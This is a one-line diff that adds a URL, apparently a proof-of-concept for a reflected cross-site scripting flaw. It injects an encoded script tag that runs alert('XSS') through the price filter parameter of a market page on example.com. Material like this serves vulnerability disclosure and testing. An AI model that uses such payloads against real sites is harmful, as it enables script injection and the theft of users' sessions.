@@ -1,0 +1,1 @@
+http://www.example.com/market/[content_dir]/?fields_filter[price][0]=%22%3E%3Cscript%3Ealert(&#039;XSS&#039;)%3C/script%3E&amp;fields_filter[price][1]=1
